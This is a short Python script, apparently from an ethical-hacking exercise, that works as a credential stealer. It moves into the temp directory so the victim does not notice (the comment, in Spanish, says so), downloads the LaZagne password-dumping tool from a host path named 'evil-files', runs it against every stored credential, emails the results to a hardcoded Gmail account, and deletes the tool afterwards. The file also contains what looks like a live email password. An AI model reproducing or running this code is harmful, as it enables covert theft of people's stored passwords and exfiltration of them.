#!/usr/bin/env python

import requests, subprocess, smtplib, os, tempfile

def downlaod(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

#Primero movernos al directorio temporal asi nadie se de cuenta.

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
downlaod("http://192.168.29.128/evil-files/laZagne_x64.exe")
result = subprocess.check_output("laZagne_x64.exe all", shell=True)
send_mail("aet3rnum2020@gmail.com", "pYo7HfcnMc", result)
os.remove("laZagne_x64.exe")